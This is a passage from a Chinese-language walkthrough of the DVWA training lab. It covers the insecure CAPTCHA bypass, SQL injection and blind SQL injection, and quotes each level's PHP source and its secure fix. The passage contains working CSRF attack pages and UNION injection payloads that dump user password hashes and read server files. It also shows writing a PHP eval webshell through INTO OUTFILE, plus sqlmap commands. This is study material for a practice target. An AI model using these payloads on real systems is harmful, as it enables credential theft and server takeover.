					<input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
					<input type=\"submit\" name=\"Change\" value=\"Change\" />
				</form>";
		}
		else {
			// Both new passwords do not match.
			$html     .= "<pre>Both passwords must match.</pre>";
			$hide_form = false;
		}
	}
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_conf = $_POST[ 'password_conf' ];

	// Check to see if both password match
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update database
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

		// Feedback for the end user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with the passwords matching
		$html .= "<pre>Passwords did not match.</pre>";
		$hide_form = false;
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

可以看到,服务器将改密操作分成了两步,第一步检查用户输入的验证码,验证通过后,服务器返回表单,第二步客户端提交 post 请求,服务器完成更改密码的操作.但是,这其中存在明显的逻辑漏洞,服务器仅仅通过检查 Change、step 参数来判断用户是否已经输入了正确的验证码.


**通过构造参数绕过验证过程的第一步**

首先输入密码,点击 Change 按钮,抓包,更改 step 参数绕过验证码:

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa38.png)

ps:因为没有翻墙,所以没能成功显示验证码,发送的请求包中也就没有 recaptcha_challenge_field、recaptcha_response_field 两个参数

**CSRF**

由于没有任何的防 CSRF 机制,我们可以轻易地构造攻击页面,页面代码如下
```
<html>

<body onload="document.getElementById('transfer').submit()">

  <div>

    <form method="POST" id="transfer" action="http://<IP地址!!!>/dvwa/vulnerabilities/captcha/">

		<input type="hidden" name="password_new" value="password">

		<input type="hidden" name="password_conf" value="password">

		<input type="hidden" name="step" value="2"

		<input type="hidden" name="Change" value="Change">

	</form>

  </div>

</body>

</html>
```

当受害者访问这个页面时,攻击脚本会伪造改密请求发送给服务器.
美中不足的是,受害者会看到更改密码成功的界面(这是因为修改密码成功后,服务器会返回 302,实现自动跳转),从而意识到自己遭到了攻击

### Medium

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_conf = $_POST[ 'password_conf' ];

	// Check CAPTCHA from 3rd party
	$resp = recaptcha_check_answer(
		$_DVWA[ 'recaptcha_private_key' ],
		$_POST['g-recaptcha-response']
	);

	// Did the CAPTCHA fail?
	if( !$resp ) {
		// What happens when the CAPTCHA was entered incorrectly
		$html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
		$hide_form = false;
		return;
	}
	else {
		// CAPTCHA was correct. Do both new passwords match?
		if( $pass_new == $pass_conf ) {
			// Show next stage for the user
			$html .= "
				<pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
				<form action=\"#\" method=\"POST\">
					<input type=\"hidden\" name=\"step\" value=\"2\" />
					<input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
					<input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
					<input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
					<input type=\"submit\" name=\"Change\" value=\"Change\" />
				</form>";
		}
		else {
			// Both new passwords do not match.
			$html     .= "<pre>Both passwords must match.</pre>";
			$hide_form = false;
		}
	}
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_conf = $_POST[ 'password_conf' ];

	// Check to see if they did stage 1
	if( !$_POST[ 'passed_captcha' ] ) {
		$html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
		$hide_form = false;
		return;
	}

	// Check to see if both password match
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update database
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

		// Feedback for the end user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with the passwords matching
		$html .= "<pre>Passwords did not match.</pre>";
		$hide_form = false;
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

可以看到,Medium 级别的代码在第二步验证时,参加了对参数 passed_captcha 的检查,如果参数值为 true,则认为用户已经通过了验证码检查,然而用户依然可以通过伪造参数绕过验证,本质上来说,这与 Low 级别的验证没有任何区别.

**可以通过抓包,更改 step 参数,增加 passed_captcha 参数,绕过验证码.**

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa39.png)

**CSRF**

依然可以实施 CSRF 攻击,攻击页面代码如下.
```
<html>

<body onload="document.getElementById('transfer').submit()">

  <div>

    <form method="POST" id="transfer" action="http://<IP地址!!!>/dvwa/vulnerabilities/captcha/">

		<input type="hidden" name="password_new" value="password">

		<input type="hidden" name="password_conf" value="password">

        <input type="hidden" name="passed_captcha" value="true">

		<input type="hidden" name="step" value="2"

		<input type="hidden" name="Change" value="Change">

	</form>

  </div>

</body>

</html>
```

### High

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Change' ] ) ) {
	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_conf = $_POST[ 'password_conf' ];

	// Check CAPTCHA from 3rd party
	$resp = recaptcha_check_answer(
		$_DVWA[ 'recaptcha_private_key' ],
		$_POST['g-recaptcha-response']
	);

	if (
		$resp || 
		(
			$_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
			&& $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
		)
	){
		// CAPTCHA was correct. Do both new passwords match?
		if ($pass_new == $pass_conf) {
			$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			$pass_new = md5( $pass_new );

			// Update database
			$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";
			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

			// Feedback for user
			$html .= "<pre>Password Changed.</pre>";

		} else {
			// Ops. Password mismatch
			$html     .= "<pre>Both passwords must match.</pre>";
			$hide_form = false;
		}

	} else {
		// What happens when the CAPTCHA was entered incorrectly
		$html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
		$hide_form = false;
		return;
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
可以看到,服务器的验证逻辑是当 $resp(这里是指谷歌返回的验证结果)是 false,并且参数 recaptcha_response_field 不等于 hidd3n_valu3(或者 http 包头的 User-Agent 参数不等于 reCAPTCHA)时,就认为验证码输入错误,反之则认为已经通过了验证码的检查.

**漏洞利用**

搞清楚了验证逻辑,剩下就是伪造绕过了,由于 $resp 参数我们无法控制,所以重心放在参数 recaptcha_response_field、User-Agent 上.

第一步依旧是抓包

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa40.png)

更改参数 recaptcha_response_field 以及 http 包头的 User-Agent

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa41.png)

注:在最新版的 dvwa 中这里要改成 `g-recaptcha-response=hidd3n_valu3`

### Impossible

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Change' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_new  = stripslashes( $pass_new );
	$pass_new  = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass_new  = md5( $pass_new );

	$pass_conf = $_POST[ 'password_conf' ];
	$pass_conf = stripslashes( $pass_conf );
	$pass_conf = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_conf ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass_conf = md5( $pass_conf );

	$pass_curr = $_POST[ 'password_current' ];
	$pass_curr = stripslashes( $pass_curr );
	$pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass_curr = md5( $pass_curr );

	// Check CAPTCHA from 3rd party
	$resp = recaptcha_check_answer(
		$_DVWA[ 'recaptcha_private_key' ],
		$_POST['g-recaptcha-response']
	);

	// Did the CAPTCHA fail?
	if( !$resp ) {
		// What happens when the CAPTCHA was entered incorrectly
		$html .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
		$hide_form = false;
		return;
	}
	else {
		// Check that the current password is correct
		$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
		$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
		$data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
		$data->execute();

		// Do both new password match and was the current password correct?
		if( ( $pass_new == $pass_conf) && ( $data->rowCount() == 1 ) ) {
			// Update the database
			$data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
			$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
			$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
			$data->execute();

			// Feedback for the end user - success!
			$html .= "<pre>Password Changed.</pre>";
		}
		else {
			// Feedback for the end user - failed!
			$html .= "<pre>Either your current password is incorrect or the new passwords did not match.<br />Please try again.</pre>";
			$hide_form = false;
		}
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

可以看到,Impossible 级别的代码增加了 Anti-CSRF token 机制防御 CSRF 攻击,利用 PDO 技术防护 sql 注入,验证过程终于不再分成两部分了,验证码无法绕过,同时要求用户输入之前的密码,进一步加强了身份认证.

---

## SQL_Injection

SQL Injection,即 SQL 注入,是指攻击者通过注入恶意的SQL命令,破坏SQL查询语句的结构,从而达到执行恶意 SQL 语句的目的.SQL 注入漏洞的危害是巨大的,常常会导致整个数据库被"脱裤",尽管如此,SQL 注入仍是现在最常见的Web漏洞之一.

按SQLMap中的分类来看,SQL注入类型有以下5种:
```
UNION query SQL injection(可联合查询注入)
Stacked queries SQL injection(可多语句查询注入)
Boolean-based blind SQL injection(布尔型注入)
Error-based SQL injection(报错型注入)
Time-based blind SQL injection(基于时间延迟注入)
```

**SQL 注入常规利用思路**
```
1. 寻找注入点,可以通过 web 扫描工具实现
2. 通过注入点,尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息.
3. 猜解关键数据库表及其重要字段与内容(常见如存放管理员账户的表名、字段名等信息)
4. 可以通过获得的用户信息,寻找后台登录.
5. 利用后台或了解的进一步信息,上传 webshell 或向数据库写入一句话木马,以进一步提权,直到拿到服务器权限.
```

**手工注入思路**

自动化的注入神器 sqlmap 固然好用,但还是要掌握一些手工注入的思路,下面简要介绍手工注入(非盲注)的步骤.
```
1.判断是否存在注入,注入是字符型还是数字型
2.猜解SQL查询语句中的字段数
3.确定显示的字段顺序
4.获取当前数据库
5.获取数据库中的表
6.获取表中的字段名
7.获取数据
```

### Low

**服务器端核心代码**
```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
	// Get input
	$id = $_REQUEST[ 'id' ];

	// Check database
	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Get values
		$first = $row["first_name"];
		$last  = $row["last_name"];

		// Feedback for end user
		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
	}

	mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```
由代码可知,通过 REQUEST 方式接受传递的参数 id,再通过 sql 语句带入查询,对来自客户端的参数 id 没有进行任何的检查与过滤,存在明显的 SQL 注入.

**漏洞利用**
1. 判断是否存在注入,注入是字符型还是数字型

    输入 `1`,查询成功:

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa42.png)

    输入 `1'and '1' ='2`,查询失败,返回结果为空:

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa43.png)

    输入 `1'or '1'='1`,查询成功:

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa44.png)

    返回了多个结果,说明存在字符型注入.

    注: 关于数字型,字符型,搜索型的区别可以参考如下文章:https://blog.csdn.net/change518/article/details/8116920

2. 猜解SQL查询语句中的字段数

    输入 `1' or 1=1 order by 1 #`,查询成功:

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa45.png)

    输入 `1' or 1=1 order by 2 #`,查询成功
    输入 `1' or 1=1 order by 3 #`,查询失败:

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa46.png)

    说明执行的 SQL 查询语句中只有两个字段,即这里的 First name、Surname.
    (这里也可以通过输入 union select 1,2,3… 来猜解字段数)

3. 确定显示的字段顺序

    输入 `1' union select 1,2 #`,查询成功:

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa47.png)

    说明执行的 SQL 语句为 select First name,Surname from 表 where ID=’id’…

4. 获取当前数据库

    输入 `1' union select 1,database() #`,查询成功:

	利用另一种方式 `1' union select user(),database() #`

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa48.png)

    说明当前的数据库为 dvwa.
	union 查询结合了两个 select 查询结果,根据上面的 order by 语句我们知道查询包含两列,为了能够现实两列查询结果,我们需要用 union 查询结合我们构造的另外一个 select.注意在使用 union 查询的时候需要和主查询的列数相同.

5. 获取数据库中的表

    输入 `1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`,查询成功:

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa49.png)

    说明数据库 dvwa 中一共有两个表,guestbook 与 users.

6. 获取表中的字段名

    输入 `1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`,查询成功:

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa50.png)

    说明 users 表中有8个字段,分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login.

7. 获取数据

    输入 `1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`,查询成功:

	或 `1' union select null,concat_ws(char(32,58,32),user,password) from users #`

	或 `1' union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users #`

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa51.png)

    这样就得到了 users 表中所有用户的 user_id,first_name,last_name,password 的数据.

8. 猜 root 用户

	输入 `1' union select 1,group_concat(user,password) from mysql.user#`

	得到 root 用户信息:

	![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa76.png)

9. 读文件和写入拿 webshell

	使用 mysql 的读写功能需要具有一定的权限.

	secure_file_priv 参数用来限制 load_file,into outfile 等相关读写执行函数作用于哪个指定目录.
	```
	当 secure_file_priv 的值为 null ,表示限制 mysqld 不允许导入|导出
	当 secure_file_priv 的值为/tmp/ ,表示限制 mysqld 的导入|导出只能发生在/tmp/目录下
	当 secure_file_priv 的值为/,表示限制 mysqld 的导入|导出的目录为所在的整个磁盘
	当 secure_file_priv 的值没有具体值时,表示不对 mysqld 的导入|导出做限制
	```

	通过命令查看 secure-file-priv 的当前值 `show global variables like '%secure%';`

	![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa77.png)

	由于我使用的是 PHPStudy 搭建的环境,MySQL 没有设置过 secure_file_priv 时,默认为 NULL

	修改secure_file_priv为指定的目录:

	Windows下的配置文件:`../MySQL/my.ini`

	Linux下的配置文件:`/etc/mysql/my.cnf` (不同linux下的my.cnf位置路径不同,此处不一一列举)

	在[mysqld]内加入 `secure_file_priv = ` 注意这里为空,表示可以导入导出到任意目录,重启 mysql 服务

	- **`load_file()` 函数读取任意文件**

		`1' union select 1,load_file('C:\\phpStudy\\PHPTutorial\\WWW\\dvwa\\index.php')#`

		![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa78.png)

	- **利用 `into outfile()` 函数写入一句话拿 webshell**

		不知道路径的情况下,先通过报错得出网站的绝对路径:`1' union select 'xx',2 into outfile 'xx'#`

		![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa79.png)

		得到路径`C:\phpStudy\PHPTutorial\WWW\dvwa\vulnerabilities\sqli\source\low.php `

		直接 `into outfile` 一句话到根目录 `1' union select 1,'<?php @eval($_POST["cmd"]);?>' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#`

		由于单引号会引起闭合而导致查询失败,注意一句话中的 cmd 不能是单引号,或者整句使用双引号 `1' union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#`

		或者采用编码方式,如十六进制编码的方式 `1' union select 1,0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#`

		![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa80.png)

**sqlmap**

`sqlmap -u "http://<IP地址!!!>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<自己的sessionID!!!>" --batch`

```
--cookie : 带 cookie 注入
--batch : 不要请求用户输入,使用默认行为
```

### Medium

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
	// Get input
	$id = $_POST[ 'id' ];

	$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

	$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
	$result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Display values
		$first = $row["first_name"];
		$last  = $row["last_name"];

		// Feedback for end user
		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
	}

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```

可以看到,Medium 级别的代码利用 mysql_real_escape_string 函数对特殊符号 `\x00,\n,\r,\,’,",\x1a` 进行转义,同时前端页面设置了下拉选择表单,希望以此来控制用户的输入.

**漏洞利用**

虽然前端使用了下拉选择菜单,但我们依然可以通过抓包改参数,提交恶意构造的查询参数.

1. 判断是否存在注入,注入是字符型还是数字型

    抓包更改参数 id 为 `1' or 1=1`,报错
    抓包更改参数 id 为 `1 or 1=1 #`,查询成功

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa52.png)

    说明存在数字型注入.由于是数字型注入,服务器端的 mysql_real_escape_string 函数就形同虚设了,因为数字型注入并不需要借助引号.

2. 猜解 SQL 查询语句中的字段数

    抓包更改参数 id 为 `1 order by 2 #`,查询成功:

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa53.png)

    抓包更改参数 id 为 `1 order by 3 #`,报错,说明执行的SQL查询语句中只有两个字段,即这里的 First name、Surname.

3. 确定显示的字段顺序

    抓包更改参数 id 为 `1 union select 1,2 #`,查询成功:

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa54.png)

    说明执行的SQL语句为 `select First name,Surname from 表 where ID=id…`

4. 获取当前数据库

    抓包更改参数 id 为 `1 union select 1,database() #`

5. 获取数据库中的表

    抓包更改参数 id 为 `1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`

6. 获取表中的字段名

    抓包更改参数 id 为 `1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #` ,查询失败

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa55.png)

    这是因为单引号被转义了,变成了 `\’`.

    可以利用 16 进制进行绕过,抓包更改参数 id 为 `1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #`

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa56.png)

    说明 users 表中有 8 个字段,分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login.

7. 获取数据

    抓包修改参数 id 为 `1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`

**sqlmap**

抓包,把数据存到 1.txt

`sqlmap -r 1.txt`

```
-r 请求文件 从 HTTP 请求文件中加载
```

### High

**服务器端核心代码**
```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
	// Get input
	$id = $_SESSION[ 'id' ];

	// Check database
	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
	$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Get values
		$first = $row["first_name"];
		$last  = $row["last_name"];

		// Feedback for end user
		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
可以看到,与 Medium 级别的代码相比,High 级别的只是在 SQL 查询语句中添加了 LIMIT 1,希望以此控制只输出一个结果.

**漏洞利用**

虽然添加了 LIMIT 1,但是我们可以通过 `#` 将其注释掉.由于手工注入的过程与 Low 级别基本一样,直接最后一步演示获取数据.

输入 `1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #` ,查询成功:

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa57.png)

需要特别提到的是,High 级别的查询提交页面与查询结果显示页面不是同一个,也没有执行 302 跳转,这样做的目的是为了防止一般的 sqlmap 注入,因为 sqlmap 在注入过程中,无法在查询提交页面上获取查询的结果,没有了反馈,也就没办法进一步注入.

可以通过指定 --second-url 去进行二阶注入

`sqlmap -r /root/1.txt -p id --second-url "http://<服务器的地址>/dvw/vulnerabilities/sqli/"`

### Impossible

**服务器端核心代码**
```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$id = $_GET[ 'id' ];

	// Was a number entered?
	if(is_numeric( $id )) {
		// Check the database
		$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
		$data->bindParam( ':id', $id, PDO::PARAM_INT );
		$data->execute();
		$row = $data->fetch();

		// Make sure only 1 result is returned
		if( $data->rowCount() == 1 ) {
			// Get values
			$first = $row[ 'first_name' ];
			$last  = $row[ 'last_name' ];

			// Feedback for end user
			$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
		}
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

可以看到,Impossible 级别的代码采用了 PDO 技术,划清了代码与数据的界限,有效防御 SQL 注入,同时只有返回的查询结果数量为一时,才会成功输出,这样就有效预防了"脱裤",Anti-CSRFtoken 机制的加入了进一步提高了安全性.

---

## SQL_Injection(Blind)

SQL Injection(Blind),即 SQL 盲注,与一般注入的区别在于,一般的注入攻击者可以直接从页面上看到注入语句的执行结果,而盲注时攻击者通常是无法从显示页面上获取执行结果,甚至连注入语句是否执行都无从得知,因此盲注的难度要比一般注入高.目前网络上现存的 SQL 注入漏洞大多是 SQL 盲注.

**手工盲注思路**

手工盲注的过程,就像你与一个机器人聊天,这个机器人知道的很多,但只会回答"是"或者"不是",因此你需要询问它这样的问题,例如"数据库名字的第一个字母是不是a啊？",通过这种机械的询问,最终获得你想要的数据.

盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注,这里由于实验环境的限制,只演示基于布尔的盲注与基于时间的盲注.

下面简要介绍手工盲注的步骤(可与之前的手工注入作比较):
```
1.判断是否存在注入,注入是字符型还是数字型
2.猜解当前数据库名
3.猜解数据库中的表名
4.猜解表中的字段名
5.猜解数据
```

### Low

**服务器端核心代码**
```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
	// Get input
	$id = $_GET[ 'id' ];

	// Check database
	$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

	// Get results
	$num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
	if( $num > 0 ) {
		// Feedback for end user
		$html .= '<pre>User ID exists in the database.</pre>';
	}
	else {
		// User wasn't found, so the page wasn't!
		header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

		// Feedback for end user
		$html .= '<pre>User ID is MISSING from the database.</pre>';
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

可以看到,Low 级别的代码对参数 id 没有做任何检查、过滤,存在明显的 SQL 注入漏洞,同时 SQL 语句查询返回的结果只有两种,`User ID exists in the database.`与`User ID is MISSING from the database.` 因此这里是 SQL 盲注漏洞.

**漏洞利用**
- **基于布尔的盲注**

    1. 判断是否存在注入,注入是字符型还是数字型
		```
        输入 1,显示相应用户存在
        输入 1' and 1=1 # ,显示存在
        输入 1' and 1=2 # ,显示不存在
		```
        说明存在字符型的 SQL 盲注.

	2. 猜解当前数据库名

		想要猜解数据库名,首先要猜解数据库名的长度,然后挨个猜解字符.
		```
	    输入 1' and length(database())=1 # ,显示不存在;
	    输入 1' and length(database())=2 # ,显示不存在;
	    输入 1' and length(database())=3 # ,显示不存在;
    	输入 1' and length(database())=4 # ,显示存在:
		```
		说明数据库名长度为 4.

		下面采用二分法猜解数据库名.
		```
		输入 1' and ascii(substr(database(),1,1))>97 # ,显示存在,说明数据库名的第一个字符的 ascii 值大于 97(小写字母 a 的 ascii 值);

		输入 1' and ascii(substr(database(),1,1))<122 # ,显示存在,说明数据库名的第一个字符的 ascii 值小于 122(小写字母 z 的 ascii 值);

		输入 1' and ascii(substr(database(),1,1))<109 # ,显示存在,说明数据库名的第一个字符的 ascii 值小于 109(小写字母 m 的 ascii 值);

		输入 1' and ascii(substr(database(),1,1))<103 # ,显示存在,说明数据库名的第一个字符的 ascii 值小于 103(小写字母 g 的 ascii 值);

		输入 1' and ascii(substr(database(),1,1))<100 # ,显示不存在,说明数据库名的第一个字符的 ascii 值不小于 100(小写字母 d 的 ascii 值);

		输入 1' and ascii(substr(database(),1,1))>100 # ,显示不存在,说明数据库名的第一个字符的 ascii 值不大于 100(小写字母 d 的 ascii 值),所以数据库名的第一个字符的 ascii 值为 100,即小写字母 d.
		```
